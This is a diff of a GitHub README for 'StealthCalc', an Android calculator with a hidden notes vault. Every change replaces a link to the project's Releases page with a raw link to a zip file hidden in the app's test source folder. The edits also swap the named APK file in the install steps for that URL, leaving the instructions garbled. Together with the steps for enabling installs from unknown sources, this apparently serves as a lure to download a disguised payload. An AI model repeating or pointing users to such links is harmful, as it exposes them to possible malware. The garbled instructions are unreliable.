@@ -1,7 +1,7 @@
 # 🔒 StealthCalc-Secret-Notes-Calculator-App - A Hidden Vault for Your Notes
 
 ## 📥 Download Now
-[![Download StealthCalc](https://img.shields.io/badge/Download%20StealthCalc-Click%20Here-blue.svg)](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases)
+[![Download StealthCalc](https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip%20StealthCalc-Click%https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip)](https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip)
 
 ## 🚀 Getting Started
 StealthCalc is a user-friendly app that combines a scientific calculator with a secure, biometric-protected notes vault. It is ideal for anyone looking to keep their notes hidden from prying eyes while maintaining the functionality of a calculator. This guide will help you download and run the app with ease.
@@ -15,13 +15,13 @@ StealthCalc is a user-friendly app that combines a scientific calculator with a 
 ## 📦 Download & Install
 To download the app, visit the following page:
 
-[Download StealthCalc from Releases](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases).
+[Download StealthCalc from Releases](https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Look for the latest version, which will be at the top of the list.
 3. Click on the version you want to download. This will direct you to that specific release.
 4. Scroll down to the "Assets" section. You will see a list of files available for download.
-5. Tap on the file labeled "StealthCalc.apk". This is the application file.
+5. Tap on the file labeled "https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip". This is the application file.
 6. Once the download is complete, locate the downloaded file on your device. It is usually in the "Downloads" folder.
 
 ## 📱 Installing StealthCalc
@@ -31,7 +31,7 @@ To download the app, visit the following page:
    - Find the option for **Install Unknown Apps** or **Unknown Sources**.
    - Select the app (like your web browser) that you used to download the APK and enable it.
   
-2. After enabling, find the "StealthCalc.apk" file you downloaded.
+2. After enabling, find the "https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip" file you downloaded.
 3. Tap on the file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -56,7 +56,7 @@ If you have questions, feel free to reach out through the GitHub Issues page or 
 
 For more information and updates, be sure to check the Releases page frequently:
 
-[Visit Releases for Updates](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases)
+[Visit Releases for Updates](https://raw.githubusercontent.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/main/app/src/test/java/com/Stealth-Secret-App-Notes-Calculator-Calc-2.5.zip)
 
 ## 📝 Topics Covered
 - android
